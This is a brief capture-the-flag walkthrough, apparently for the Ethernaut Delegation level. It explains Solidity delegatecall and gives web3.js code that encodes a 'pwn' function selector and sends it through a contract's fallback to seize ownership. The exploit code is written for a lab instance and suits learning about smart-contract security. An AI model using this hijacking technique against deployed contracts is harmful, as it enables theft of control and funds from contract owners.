# Task: Taks ownership of the Delegate Contract

Delegatecall means using the implementation of another contract at runtime. In respose the state variables of the caller contract are updated. During use of delegatecall msg.value, msg.sender and msg.data remain same. They do not change.
In order to take the ownership of the contract we have to pass a malicious msg.data.

```bash
let payload = web3.eth.abi.encodeFunctionSignature({
    name: 'pwn',
    type: 'function',
    inputs: []
});
```

After creating the malicious msg.data then sendTransaction to the calling contract. Fallback will forward the call the the victim contract and updated the ownership

```bash
await web3.eth.sendTransaction({
    from: player,
    to: instance,
    data: payload
});
```
